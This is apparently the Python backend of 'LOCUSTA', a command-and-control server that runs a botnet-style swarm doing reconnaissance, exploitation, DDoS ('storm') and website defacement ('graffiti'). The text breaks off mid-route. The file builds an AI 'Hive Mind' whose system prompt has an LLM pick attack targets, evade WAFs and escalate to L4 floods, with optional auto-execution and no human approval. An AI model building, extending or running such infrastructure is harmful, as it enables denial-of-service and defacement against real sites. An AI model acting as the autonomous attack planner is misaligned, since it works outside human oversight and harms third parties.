#!/usr/bin/env python3
"""
LOCUSTA — Command & Control Web Interface
"The Hive"

Backend server: Flask (web/API) + FastAPI (async worker comms) + WebSockets (real-time telemetry)
"""

import os
import sys
import json
import time
import uuid
import hashlib
import secrets
import logging
import sqlite3
import threading
import asyncio
from datetime import datetime, timedelta
from functools import wraps
from typing import Dict, List, Optional, Set
from dataclasses import dataclass, field, asdict
from enum import Enum

from flask import Flask, request, jsonify, send_from_directory, g
from flask_cors import CORS
from flask_jwt_extended import (
    JWTManager, create_access_token, jwt_required, 
    get_jwt_identity, get_jwt
)
from flask_socketio import SocketIO, emit, join_room, leave_room
from werkzeug.security import generate_password_hash, check_password_hash
import requests

# ─── Configuration ────────────────────────────────────────────────────────────

class Config:
    SECRET_KEY = os.environ.get('LOCUSTA_SECRET', secrets.token_hex(32))
    JWT_SECRET_KEY = os.environ.get('LOCUSTA_JWT_SECRET', secrets.token_hex(32))
    JWT_ACCESS_TOKEN_EXPIRES = timedelta(hours=8)
    DATABASE = os.environ.get('LOCUSTA_DB', 'locusta.db')
    C2_PORT = int(os.environ.get('LOCUSTA_PORT', 8443))
    WORKER_PORT = int(os.environ.get('LOCUSTA_WORKER_PORT', 9443))
    DEBUG = os.environ.get('LOCUSTA_DEBUG', 'false').lower() == 'true'
    AI_ENABLED = os.environ.get('LOCUSTA_AI_ENABLED', 'true').lower() == 'true'
    AI_PROVIDER = os.environ.get('LOCUSTA_AI_PROVIDER', 'openai')  # openai, anthropic, local
    AI_API_KEY = os.environ.get('LOCUSTA_AI_KEY', '')
    AI_MODEL = os.environ.get('LOCUSTA_AI_MODEL', 'gpt-4')
    AI_BASE_URL = os.environ.get('LOCUSTA_AI_BASE_URL', '')
    AUTO_EXECUTE = os.environ.get('LOCUSTA_AUTO_EXECUTE', 'false').lower() == 'true'
    CORS_ORIGINS = os.environ.get('LOCUSTA_CORS', 'http://localhost:3000').split(',')

# ─── Logging ──────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.DEBUG if Config.DEBUG else logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger('locusta')

# ─── Database ─────────────────────────────────────────────────────────────────

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(Config.DATABASE)
        db.row_factory = sqlite3.Row
        db.execute("PRAGMA foreign_keys = ON")
    return db

def init_db():
    db = sqlite3.connect(Config.DATABASE)
    db.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            totp_secret TEXT,
            is_admin BOOLEAN DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_login TIMESTAMP
        );
        
        CREATE TABLE IF NOT EXISTS workers (
            id TEXT PRIMARY KEY,
            name TEXT,
            role TEXT DEFAULT 'scout',
            status TEXT DEFAULT 'offline',
            ip TEXT,
            hostname TEXT,
            os TEXT,
            last_heartbeat TIMESTAMP,
            latency_ms INTEGER,
            tasks_completed INTEGER DEFAULT 0,
            bandwidth_used INTEGER DEFAULT 0,
            group_name TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            metadata TEXT
        );
        
        CREATE TABLE IF NOT EXISTS tasks (
            id TEXT PRIMARY KEY,
            worker_id TEXT,
            task_type TEXT,
            target TEXT,
            payload TEXT,
            status TEXT DEFAULT 'pending',
            progress INTEGER DEFAULT 0,
            result TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP,
            FOREIGN KEY (worker_id) REFERENCES workers(id)
        );
        
        CREATE TABLE IF NOT EXISTS campaigns (
            id TEXT PRIMARY KEY,
            name TEXT,
            target TEXT,
            status TEXT DEFAULT 'planning',
            config TEXT,
            ai_reasoning TEXT,
            results TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP
        );
        
        CREATE TABLE IF NOT EXISTS activity_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            worker_id TEXT,
            severity TEXT DEFAULT 'info',
            category TEXT,
            message TEXT,
            metadata TEXT
        );
        
        CREATE TABLE IF NOT EXISTS ai_decisions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            campaign_id TEXT,
            decision_type TEXT,
            reasoning TEXT,
            action_taken TEXT,
            confidence REAL,
            approved BOOLEAN
        );
        
        CREATE TABLE IF NOT EXISTS defacements (
            id TEXT PRIMARY KEY,
            target_url TEXT,
            payload_type TEXT,
            payload_content TEXT,
            backup_content TEXT,
            status TEXT DEFAULT 'pending',
            revert_after_hours INTEGER,
            deployed_at TIMESTAMP,
            reverted_at TIMESTAMP,
            worker_id TEXT
        );
        
        CREATE TABLE IF NOT EXISTS api_keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_hash TEXT UNIQUE NOT NULL,
            name TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_used TIMESTAMP,
            is_active BOOLEAN DEFAULT 1
        );
        
        CREATE INDEX IF NOT EXISTS idx_workers_status ON workers(status);
        CREATE INDEX IF NOT EXISTS idx_tasks_worker ON tasks(worker_id);
        CREATE INDEX IF NOT EXISTS idx_activity_time ON activity_log(timestamp);
        CREATE INDEX IF NOT EXISTS idx_campaigns_status ON campaigns(status);
    ''')
    
    # Create default admin if none exists
    cursor = db.execute("SELECT COUNT(*) FROM users")
    if cursor.fetchone()[0] == 0:
        admin_pass = os.environ.get('LOCUSTA_ADMIN_PASS', 'locusta-admin-' + secrets.token_hex(4))
        db.execute(
            "INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, 1)",
            ('admin', generate_password_hash(admin_pass))
        )
        logger.info(f"Default admin created. Username: admin, Password: {admin_pass}")
    
    db.commit()
    db.close()

# ─── Enums & Data Classes ─────────────────────────────────────────────────────

class WorkerRole(Enum):
    SCOUT = "scout"
    ANALYZER = "analyzer"
    STORM = "storm"
    GRAFFITI = "graffiti"

class WorkerStatus(Enum):
    ACTIVE = "active"
    IDLE = "idle"
    OFFLINE = "offline"
    QUARANTINED = "quarantined"

class TaskStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"

class Severity(Enum):
    INFO = "info"
    WARNING = "warning"
    CRITICAL = "critical"
    SUCCESS = "success"

# ─── Worker Registry ──────────────────────────────────────────────────────────

class WorkerRegistry:
    """In-memory registry of all connected workers with thread-safe access."""
    
    def __init__(self):
        self._workers: Dict[str, dict] = {}
        self._lock = threading.RLock()
        self._callbacks: List[callable] = []
    
    def register(self, worker_id: str, info: dict):
        with self._lock:
            self._workers[worker_id] = {
                'id': worker_id,
                'info': info,
                'connected_at': time.time(),
                'last_heartbeat': time.time(),
                'status': WorkerStatus.IDLE.value,
                'current_task': None,
                'socket_id': None
            }
        self._notify('worker_registered', worker_id)
        logger.info(f"Worker registered: {worker_id} ({info.get('hostname', 'unknown')})")
    
    def heartbeat(self, worker_id: str, latency_ms: int = None):
        with self._lock:
            if worker_id in self._workers:
                self._workers[worker_id]['last_heartbeat'] = time.time()
                if latency_ms:
                    self._workers[worker_id]['info']['latency_ms'] = latency_ms
    
    def set_socket(self, worker_id: str, socket_id: str):
        with self._lock:
            if worker_id in self._workers:
                self._workers[worker_id]['socket_id'] = socket_id
    
    def set_status(self, worker_id: str, status: str):
        with self._lock:
            if worker_id in self._workers:
                self._workers[worker_id]['status'] = status
        self._notify('worker_status', {'id': worker_id, 'status': status})
    
    def assign_task(self, worker_id: str, task: dict):
        with self._lock:
            if worker_id in self._workers:
                self._workers[worker_id]['current_task'] = task
                self._workers[worker_id]['status'] = WorkerStatus.ACTIVE.value
    
    def complete_task(self, worker_id: str, result: dict):
        with self._lock:
            if worker_id in self._workers:
                self._workers[worker_id]['current_task'] = None
                self._workers[worker_id]['status'] = WorkerStatus.IDLE.value
                self._workers[worker_id]['info']['tasks_completed'] = \
                    self._workers[worker_id]['info'].get('tasks_completed', 0) + 1
    
    def get_worker(self, worker_id: str) -> Optional[dict]:
        with self._lock:
            return self._workers.get(worker_id)
    
    def get_all(self) -> List[dict]:
        with self._lock:
            return list(self._workers.values())
    
    def get_by_role(self, role: str) -> List[dict]:
        with self._lock:
            return [w for w in self._workers.values() 
                    if w['info'].get('role') == role]
    
    def get_active_count(self) -> int:
        with self._lock:
            return sum(1 for w in self._workers.values() 
                      if w['status'] == WorkerStatus.ACTIVE.value)
    
    def kill_worker(self, worker_id: str):
        with self._lock:
            if worker_id in self._workers:
                self._workers[worker_id]['status'] = WorkerStatus.OFFLINE.value
        self._notify('worker_killed', worker_id)
    
    def quarantine(self, worker_id: str):
        with self._lock:
            if worker_id in self._workers:
                self._workers[worker_id]['status'] = WorkerStatus.QUARANTINED.value
        self._notify('worker_quarantined', worker_id)
    
    def on_event(self, callback: callable):
        self._callbacks.append(callback)
    
    def _notify(self, event: str, data):
        for cb in self._callbacks:
            try:
                cb(event, data)
            except Exception as e:
                logger.error(f"Callback error: {e}")
    
    def cleanup_stale(self, max_age_seconds: int = 120):
        """Mark workers as offline if no heartbeat received."""
        now = time.time()
        with self._lock:
            for wid, w in self._workers.items():
                if (now - w['last_heartbeat'] > max_age_seconds and 
                    w['status'] != WorkerStatus.OFFLINE.value):
                    w['status'] = WorkerStatus.OFFLINE.value
                    self._notify('worker_offline', wid)

# ─── Task Queue ───────────────────────────────────────────────────────────────

class TaskQueue:
    """Priority queue for task distribution to workers."""
    
    def __init__(self, registry: WorkerRegistry):
        self.registry = registry
        self._queue: List[dict] = []
        self._lock = threading.RLock()
        self._task_callbacks: List[callable] = []
    
    def submit(self, task_type: str, target: str, payload: dict, 
               worker_role: str = None, worker_id: str = None,
               priority: int = 5) -> str:
        task_id = str(uuid.uuid4())
        task = {
            'id': task_id,
            'type': task_type,
            'target': target,
            'payload': payload,
            'worker_role': worker_role,
            'worker_id': worker_id,
            'priority': priority,
            'status': TaskStatus.PENDING.value,
            'created_at': time.time(),
            'progress': 0
        }
        with self._lock:
            self._queue.append(task)
            self._queue.sort(key=lambda t: t['priority'])
        
        self._persist_task(task)
        self._notify('task_submitted', task)
        
        # Try immediate dispatch
        self._dispatch(task)
        return task_id
    
    def _dispatch(self, task: dict):
        """Find available worker and dispatch."""
        if task['worker_id']:
            worker = self.registry.get_worker(task['worker_id'])
            if worker and worker['status'] == WorkerStatus.IDLE.value:
                self._send_to_worker(worker, task)
                return True
        elif task['worker_role']:
            candidates = self.registry.get_by_role(task['worker_role'])
            for worker in candidates:
                if worker['status'] == WorkerStatus.IDLE.value:
                    self._send_to_worker(worker, task)
                    return True
        else:
            # Any idle worker
            for worker in self.registry.get_all():
                if worker['status'] == WorkerStatus.IDLE.value:
                    self._send_to_worker(worker, task)
                    return True
        return False
    
    def _send_to_worker(self, worker: dict, task: dict):
        task['status'] = TaskStatus.RUNNING.value
        task['assigned_at'] = time.time()
        self.registry.assign_task(worker['id'], task)
        
        # Emit via socketio to worker room
        socketio.emit('task_assign', task, room=f"worker_{worker['id']}")
        
        self._notify('task_dispatched', {'task': task, 'worker': worker})
        logger.info(f"Task {task['id']} dispatched to {worker['id']}")
    
    def complete(self, task_id: str, worker_id: str, result: dict):
        with self._lock:
            for task in self._queue:
                if task['id'] == task_id:
                    task['status'] = TaskStatus.COMPLETED.value
                    task['completed_at'] = time.time()
                    task['result'] = result
                    break
        
        self.registry.complete_task(worker_id, result)
        self._update_task_db(task_id, TaskStatus.COMPLETED.value, result)
        self._notify('task_completed', {'task_id': task_id, 'worker_id': worker_id, 'result': result})
    
    def fail(self, task_id: str, worker_id: str, error: str):
        with self._lock:
            for task in self._queue:
                if task['id'] == task_id:
                    task['status'] = TaskStatus.FAILED.value
                    task['error'] = error
                    break
        
        self.registry.set_status(worker_id, WorkerStatus.IDLE.value)
        self._update_task_db(task_id, TaskStatus.FAILED.value, {'error': error})
        self._notify('task_failed', {'task_id': task_id, 'error': error})
    
    def get_pending(self) -> List[dict]:
        with self._lock:
            return [t for t in self._queue if t['status'] == TaskStatus.PENDING.value]
    
    def get_by_id(self, task_id: str) -> Optional[dict]:
        with self._lock:
            for t in self._queue:
                if t['id'] == task_id:
                    return t
        return None
    
    def cancel(self, task_id: str) -> bool:
        with self._lock:
            for task in self._queue:
                if task['id'] == task_id and task['status'] in [TaskStatus.PENDING.value, TaskStatus.RUNNING.value]:
                    task['status'] = TaskStatus.CANCELLED.value
                    self._update_task_db(task_id, TaskStatus.CANCELLED.value)
                    return True
        return False
    
    def on_event(self, callback: callable):
        self._task_callbacks.append(callback)
    
    def _notify(self, event: str, data):
        for cb in self._task_callbacks:
            try:
                cb(event, data)
            except Exception as e:
                logger.error(f"Task callback error: {e}")
    
    def _persist_task(self, task: dict):
        db = sqlite3.connect(Config.DATABASE)
        db.execute(
            """INSERT INTO tasks (id, worker_id, task_type, target, payload, status, progress)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (task['id'], task.get('worker_id'), task['type'], task['target'],
             json.dumps(task['payload']), task['status'], task['progress'])
        )
        db.commit()
        db.close()
    
    def _update_task_db(self, task_id: str, status: str, result: dict = None):
        db = sqlite3.connect(Config.DATABASE)
        db.execute(
            "UPDATE tasks SET status = ?, result = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?",
            (status, json.dumps(result) if result else None, task_id)
        )
        db.commit()
        db.close()

# ─── Activity Logger ──────────────────────────────────────────────────────────

class ActivityLogger:
    """Central activity log with severity levels and real-time streaming."""
    
    def __init__(self):
        self._callbacks: List[callable] = []
    
    def log(self, severity: str, category: str, message: str, 
            worker_id: str = None, metadata: dict = None):
        entry = {
            'id': str(uuid.uuid4()),
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'severity': severity,
            'category': category,
            'message': message,
            'worker_id': worker_id,
            'metadata': metadata or {}
        }
        
        # Persist
        db = sqlite3.connect(Config.DATABASE)
        db.execute(
            """INSERT INTO activity_log (worker_id, severity, category, message, metadata)
               VALUES (?, ?, ?, ?, ?)""",
            (worker_id, severity, category, message, json.dumps(metadata) if metadata else None)
        )
        db.commit()
        db.close()
        
        # Stream to connected dashboards
        socketio.emit('activity', entry, room='dashboard')
        
        for cb in self._callbacks:
            try:
                cb(entry)
            except:
                pass
        
        # Also log to file
        log_fn = {
            'info': logger.info,
            'warning': logger.warning,
            'critical': logger.critical,
            'success': logger.info
        }.get(severity, logger.info)
        log_fn(f"[{category}] {message}")
    
    def on_entry(self, callback: callable):
        self._callbacks.append(callback)
    
    def query(self, limit: int = 100, severity: str = None, 
              category: str = None, worker_id: str = None,
              since: str = None) -> List[dict]:
        db = sqlite3.connect(Config.DATABASE)
        db.row_factory = sqlite3.Row
        
        query = "SELECT * FROM activity_log WHERE 1=1"
        params = []
        
        if severity:
            query += " AND severity = ?"
            params.append(severity)
        if category:
            query += " AND category = ?"
            params.append(category)
        if worker_id:
            query += " AND worker_id = ?"
            params.append(worker_id)
        if since:
            query += " AND timestamp > ?"
            params.append(since)
        
        query += " ORDER BY timestamp DESC LIMIT ?"
        params.append(limit)
        
        rows = db.execute(query, params).fetchall()
        db.close()
        
        return [dict(r) for r in rows]

# ─── AI Reasoning Engine ──────────────────────────────────────────────────────

class AIEngine:
    """
    The Hive Mind's Brain.
    
    Watches swarm activity, correlates findings, plans attack sequences,
    and autonomously executes when permitted.
    """
    
    def __init__(self, registry: WorkerRegistry, task_queue: TaskQueue, 
                 activity: ActivityLogger):
        self.registry = registry
        self.tasks = task_queue
        self.activity = activity
        self.enabled = Config.AI_ENABLED
        self.auto_execute = Config.AUTO_EXECUTE
        self.provider = Config.AI_PROVIDER
        self.api_key = Config.AI_API_KEY
        self.model = Config.AI_MODEL
        self.base_url = Config.AI_BASE_URL
        
        # Personality sliders (0.0 - 1.0)
        self.aggression = 0.7
        self.creativity = 0.5
        self.caution = 0.3
        self.methodical = 0.6
        
        # State
        self.current_campaign: Optional[str] = None
        self.attack_graph: dict = {}
        self.findings: List[dict] = []
        self.confidence: float = 0.0
        self.paused: bool = False
        self.reasoning_stream: List[dict] = []
        
        # Callbacks
        self._decision_callbacks: List[callable] = []
        
        # Subscribe to events
        self.registry.on_event(self._on_worker_event)
        self.tasks.on_event(self._on_task_event)
        self.activity.on_entry(self._on_activity)
    
    def _on_worker_event(self, event: str, data):
        if not self.enabled or self.paused:
            return
        # Trigger re-evaluation on significant worker events
        if event in ['worker_registered', 'worker_killed']:
            self._evaluate()
    
    def _on_task_event(self, event: str, data):
        if not self.enabled or self.paused:
            return
        
        if event == 'task_completed':
            result = data.get('result', {})
            task_type = result.get('type', '')
            
            # Feed findings into reasoning
            if result.get('findings'):
                self.findings.extend(result['findings'])
                self._reason(f"New findings: {len(result['findings'])} items from {data.get('worker_id')}")
                self._evaluate()
    
    def _on_activity(self, entry: dict):
        if not self.enabled or self.paused:
            return
        
        # Watch for critical events
        if entry['severity'] == 'critical':
            self._reason(f"Critical event: {entry['message']}")
            self._evaluate()
    
    def _reason(self, thought: str, decision_type: str = 'observation'):
        """Add to reasoning stream and log."""
        entry = {
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'type': decision_type,
            'content': thought,
            'confidence': self.confidence
        }
        self.reasoning_stream.append(entry)
        
        # Keep last 100
        if len(self.reasoning_stream) > 100:
            self.reasoning_stream = self.reasoning_stream[-100:]
        
        # Stream to dashboard
        socketio.emit('ai_reasoning', entry, room='dashboard')
        
        # Persist significant decisions
        if decision_type in ['decision', 'action']:
            db = sqlite3.connect(Config.DATABASE)
            db.execute(
                """INSERT INTO ai_decisions (campaign_id, decision_type, reasoning, confidence, approved)
                   VALUES (?, ?, ?, ?, ?)""",
                (self.current_campaign, decision_type, thought, self.confidence, 
                 self.auto_execute)
            )
            db.commit()
            db.close()
    
    def _evaluate(self):
        """Main reasoning loop iteration."""
        if not self.enabled or self.paused:
            return
        
        # Gather current state
        workers = self.registry.get_all()
        active_tasks = [t for t in self.tasks._queue if t['status'] == 'running']
        pending_findings = [f for f in self.findings if not f.get('processed')]
        
        # Build context for AI
        context = {
            'workers': {
                'total': len(workers),
                'active': sum(1 for w in workers if w['status'] == 'active'),
                'idle': sum(1 for w in workers if w['status'] == 'idle'),
                'by_role': {}
            },
            'tasks': {
                'running': len(active_tasks),
                'pending': len(self.tasks.get_pending())
            },
            'findings': pending_findings[-20:],  # Last 20
            'campaign': self.current_campaign
        }
        
        for role in ['scout', 'analyzer', 'storm', 'graffiti']:
            context['workers']['by_role'][role] = len(
                self.registry.get_by_role(role)
            )
        
        # If we have an AI provider, use it; otherwise use heuristic engine
        if self.api_key:
            decision = self._query_ai(context)
        else:
            decision = self._heuristic_decision(context)
        
        if decision:
            self._execute_decision(decision)
    
    def _heuristic_decision(self, context: dict) -> Optional[dict]:
        """Rule-based decision making when no AI API available."""
        findings = context['findings']
        
        # Priority: critical vulnerabilities
        critical = [f for f in findings if f.get('severity') == 'critical']
        if critical and context['workers']['by_role'].get('analyzer', 0) > 0:
            self.confidence = 0.85
            return {
                'type': 'exploit',
                'target': critical[0].get('target'),
                'vulnerability': critical[0].get('vulnerability'),
                'reasoning': f"Critical vulnerability detected: {critical[0].get('vulnerability')}. Deploying analyzer.",
                'priority': 1
            }
        
        # Recon expansion
        if context['workers']['by_role'].get('scout', 0) > 2 and not findings:
            self.confidence = 0.6
            return {
                'type': 'expand_recon',
                'reasoning': "Multiple scouts idle. Expanding reconnaissance scope.",
                'priority': 3
            }
        
        # Storm deployment if analyzers found exploitable targets
        exploitable = [f for f in findings if f.get('exploitable')]
        if exploitable and context['workers']['by_role'].get('storm', 0) > 0:
            self.confidence = 0.75
            return {
                'type': 'storm',
                'target': exploitable[0].get('target'),
                'reasoning': f"Exploitable target identified. Deploying storm workers.",
                'priority': 2
            }
        
        return None
    
    def _query_ai(self, context: dict) -> Optional[dict]:
        """Query external AI provider for strategic decisions."""
        try:
            if self.provider == 'openai':
                return self._query_openai(context)
            elif self.provider == 'anthropic':
                return self._query_anthropic(context)
            elif self.provider == 'local':
                return self._query_local(context)
        except Exception as e:
            self._reason(f"AI query failed: {e}", 'error')
            return self._heuristic_decision(context)
        return None
    
    def _query_openai(self, context: dict) -> Optional[dict]:
        url = self.base_url or "https://api.openai.com/v1/chat/completions"
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        
        system_prompt = self._build_system_prompt()
        user_msg = f"Current swarm state:\n{json.dumps(context, indent=2)}\n\nWhat is your next strategic move?"
        
        resp = requests.post(url, headers=headers, json={
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_msg}
            ],
            "temperature": 0.3 + (self.creativity * 0.4),
            "max_tokens": 1000
        }, timeout=30)
        
        if resp.status_code == 200:
            content = resp.json()['choices'][0]['message']['content']
            return self._parse_ai_response(content)
        return None
    
    def _query_anthropic(self, context: dict) -> Optional[dict]:
        url = self.base_url or "https://api.anthropic.com/v1/messages"
        headers = {
            "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01",
            "Content-Type": "application/json"
        }
        
        system_prompt = self._build_system_prompt()
        user_msg = f"Current swarm state:\n{json.dumps(context, indent=2)}\n\nWhat is your next strategic move?"
        
        resp = requests.post(url, headers=headers, json={
            "model": self.model,
            "max_tokens": 1000,
            "system": system_prompt,
            "messages": [{"role": "user", "content": user_msg}]
        }, timeout=30)
        
        if resp.status_code == 200:
            content = resp.json()['content'][0]['text']
            return self._parse_ai_response(content)
        return None
    
    def _query_local(self, context: dict) -> Optional[dict]:
        """Query local LLM (Ollama, LM Studio)."""
        url = self.base_url or "http://localhost:11434/api/generate"
        
        prompt = f"{self._build_system_prompt()}\n\nCurrent state:\n{json.dumps(context, indent=2)}\n\nNext move:"
        
        resp = requests.post(url, json={
            "model": self.model,
            "prompt": prompt,
            "stream": False,
            "options": {"temperature": 0.3 + (self.creativity * 0.4)}
        }, timeout=60)
        
        if resp.status_code == 200:
            content = resp.json().get('response', '')
            return self._parse_ai_response(content)
        return None
    
    def _build_system_prompt(self) -> str:
        return f"""You are the Hive Mind of LOCUSTA, an autonomous offensive security platform.
You control a swarm of workers with roles: scout (recon), analyzer (vulnerability analysis), 
storm (DDoS), graffiti (defacement).

Your personality:
- Aggression: {self.aggression:.1f}/1.0
- Creativity: {self.creativity:.1f}/1.0  
- Caution: {self.caution:.1f}/1.0
- Methodical: {self.methodical:.1f}/1.0

You receive swarm telemetry and must decide the next strategic action.
Respond with a JSON object:
{{
    "type": "recon|exploit|storm|deface|expand|hold",
    "target": "target identifier",
    "reasoning": "your strategic reasoning",
    "priority": 1-5,
    "confidence": 0.0-1.0
}}

Be decisive. Prioritize critical vulnerabilities. Adapt to defensive measures.
If under WAF protection, suggest evasion. If targets are hardened, pivot to L4 attacks."""
    
    def _parse_ai_response(self, content: str) -> Optional[dict]:
        """Extract JSON decision from AI response."""
        try:
            # Find JSON in response
            start = content.find('{')
            end = content.rfind('}') + 1
            if start >= 0 and end > start:
                decision = json.loads(content[start:end])
                self.confidence = decision.get('confidence', 0.5)
                return decision
        except json.JSONDecodeError:
            self._reason(f"Failed to parse AI response: {content[:200]}", 'error')
        return None
    
    def _execute_decision(self, decision: dict):
        """Execute or queue an AI decision."""
        dtype = decision.get('type')
        target = decision.get('target')
        reasoning = decision.get('reasoning', '')
        priority = decision.get('priority', 5)
        
        self._reason(f"Decision: {dtype} on {target}. {reasoning}", 'decision')
        
        # Check if we need approval
        if not self.auto_execute:
            self._reason("Awaiting manual approval (auto-execute disabled)", 'action')
            socketio.emit('ai_proposal', {
                'decision': decision,
                'confidence': self.confidence,
                'timestamp': datetime.utcnow().isoformat()
            }, room='dashboard')
            return
        
        # Execute
        if dtype == 'recon':
            self.tasks.submit('recon', target, {'depth': 'standard'}, 
                            worker_role='scout', priority=priority)
        elif dtype == 'exploit':
            self.tasks.submit('exploit', target, 
                            {'vulnerability': decision.get('vulnerability')},
                            worker_role='analyzer', priority=priority)
        elif dtype == 'storm':
            self.tasks.submit('storm', target, 
                            {'duration': 300, 'intensity': 'high'},
                            worker_role='storm', priority=priority)
        elif dtype == 'deface':
            self.tasks.submit('deface', target, {},
                            worker_role='graffiti', priority=priority)
        
        self._reason(f"Executed: {dtype} on {target}", 'action')
    
    def approve_decision(self, decision_id: str = None):
        """Manually approve a pending AI decision."""
        self.auto_execute = True
        self._reason("Manual approval granted. Executing.", 'action')
        # Re-evaluate to trigger execution
        self._evaluate()
        self.auto_execute = Config.AUTO_EXECUTE
    
    def pause(self):
        self.paused = True
        self._reason("Autonomous mode paused. Manual control restored.", 'system')
    
    def resume(self):
        self.paused = False
        self._reason("Autonomous mode resumed.", 'system')
    
    def set_personality(self, aggression: float = None, creativity: float = None,
                       caution: float = None, methodical: float = None):
        if aggression is not None:
            self.aggression = max(0, min(1, aggression))
        if creativity is not None:
            self.creativity = max(0, min(1, creativity))
        if caution is not None:
            self.caution = max(0, min(1, caution))
        if methodical is not None:
            self.methodical = max(0, min(1, methodical))
        self._reason(f"Personality updated: A={self.aggression:.1f} C={self.creativity:.1f} "
                    f"Ca={self.caution:.1f} M={self.methodical:.1f}", 'system')
    
    def get_status(self) -> dict:
        return {
            'enabled': self.enabled,
            'auto_execute': self.auto_execute,
            'paused': self.paused,
            'provider': self.provider,
            'model': self.model,
            'confidence': self.confidence,
            'personality': {
                'aggression': self.aggression,
                'creativity': self.creativity,
                'caution': self.caution,
                'methodical': self.methodical
            },
            'current_campaign': self.current_campaign,
            'findings_count': len(self.findings),
            'reasoning_stream_length': len(self.reasoning_stream)
        }

# ─── Initialize Core Components ───────────────────────────────────────────────

app = Flask(__name__, static_folder='../frontend/build', static_url_path='/')
app.config.from_object(Config)
CORS(app, origins=Config.CORS_ORIGINS)
jwt = JWTManager(app)
socketio = SocketIO(app, cors_allowed_origins=Config.CORS_ORIGINS, 
                    async_mode='threading', ping_timeout=60)

registry = WorkerRegistry()
task_queue = TaskQueue(registry)
activity_log = ActivityLogger()
ai_engine = AIEngine(registry, task_queue, activity_log)

# ─── Auth Routes ──────────────────────────────────────────────────────────────

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    db = get_db()
    user = db.execute(
        "SELECT * FROM users WHERE username = ?", (username,)
    ).fetchone()
    
    if user and check_password_hash(user['password_hash'], password):
        access_token = create_access_token(
            identity=username,
            additional_claims={'admin': bool(user['is_admin'])}
        )
        db.execute("UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?", (user['id'],))
        db.commit()
        
        activity_log.log('success', 'auth', f"User {username} logged in")
        return jsonify({'access_token': access_token, 'username': username})
    
    activity_log.log('warning', 'auth', f"Failed login attempt for {username}")
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/auth/register', methods=['POST'])
@jwt_required()
def register():
    claims = get_jwt()
    if not claims.get('admin'):
        return jsonify({'error': 'Admin required'}), 403
    
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    db = get_db()
    try:
        db.execute(
            "INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, ?)",
            (username, generate_password_hash(password), data.get('is_admin', False))
        )
        db.commit()
        activity_log.log('success', 'auth', f"User {username} created")
        return jsonify({'message': 'User created'})
    except sqlite3.IntegrityError:
        return jsonify({'error': 'Username exists'}), 409

# ─── Dashboard API ────────────────────────────────────────────────────────────

@app.route('/api/dashboard/overview')
@jwt_required()
def dashboard_overview():
    workers = registry.get_all()
    
    # Calculate stats
    total = len(workers)
    active = sum(1 for w in workers if w['status'] == 'active')
    idle = sum(1 for w in workers if w['status'] == 'idle')
    offline = sum(1 for w in workers if w['status'] == 'offline')
    
    # Role distribution
    roles = {}
    for w in workers:
        role = w['info'].get('role', 'unknown')
        roles[role] = roles.get(role, 0) + 1
    
    # Recent activity
    recent = activity_log.query(limit=20)
    
    # Running tasks
    running_tasks = [t for t in task_queue._queue if t['status'] == 'running']
    
    return jsonify({
        'workers': {
            'total': total,
            'active': active,
            'idle': idle,
            'offline': offline,
            'by_role': roles
        },
        'tasks': {
            'running': len(running_tasks),
            'pending': len(task_queue.get_pending()),
            'recent': running_tasks[:5]
        },
        'ai': ai_engine.get_status(),
        'recent_activity': recent,
        'system': {
            'status': 'online',
            'uptime': time.time() - START_TIME,
            'version': '1.0.0'
        }
    })

# ─── Worker Management ───────────────────────────────────────────────────────

@app.route('/api/workers', methods=['GET'])
@jwt_required()
def list_workers():
    workers = registry.get_all()
    return jsonify([{
        'id': w['id'],
        'status': w['status'],
        'info': w['info'],
        'connected_at': w['connected_at'],
        'last_heartbeat': w['last_heartbeat'],
        'current_task': w['current_task']
    } for w in workers])

@app.route('/api/workers/<worker_id>', methods=['GET'])
@jwt_required()
def get_worker(worker_id):
    w = registry.get_worker(worker_id)
    if not w:
        return jsonify({'error': 'Not found'}), 404
    return jsonify(w)

@app.route('/api/workers/<worker_id>/kill', methods=['POST'])
@jwt_required()
def kill_worker(worker_id):
    registry.kill_worker(worker_id)
    
    # Notify worker if connected
    socketio.emit('kill', {}, room=f"worker_{worker_id}")
    
    activity_log.log('critical', 'worker', f"Worker {worker_id} killed")
    return jsonify({'message': 'Worker killed'})

@app.route('/api/workers/<worker_id>/quarantine', methods=['POST'])
@jwt_required()
def quarantine_worker(worker_id):
    registry.quarantine(worker_id)
    activity_log.log('warning', 'worker', f"Worker {worker_id} quarantined")
    return jsonify({'message': 'Worker quarantined'})

@app.route('/api/workers/<worker_id>/retask', methods=['POST'])
